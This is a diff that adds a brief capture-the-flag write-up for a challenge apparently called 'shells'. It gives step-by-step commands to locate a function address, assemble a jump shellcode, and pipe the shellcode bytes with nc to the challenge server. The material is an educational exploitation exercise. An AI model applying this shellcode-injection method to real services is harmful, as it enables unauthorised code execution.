@@ -1,0 +1,13 @@
+1- Execute "nm -a shells" on the binary to get the address of the function, we see that it is "0x08048540"
+
+2- According to reverse engineering book, to begin execution at a specific place:
+save the following assembly code into shellcode.asm :
+push 0x08048540
+ret
+
+3- Compile it with "nasm -f elf shellcode.asm"
+
+4- get the shellcode with "objdump -d shellcode.o":
+\x68\x40\x85\x04\x08\xc3
+
+5- get the flag with echo -e "\x68\x40\x85\x04\x08\xc3" | nc shell2017.picoctf.com 40976
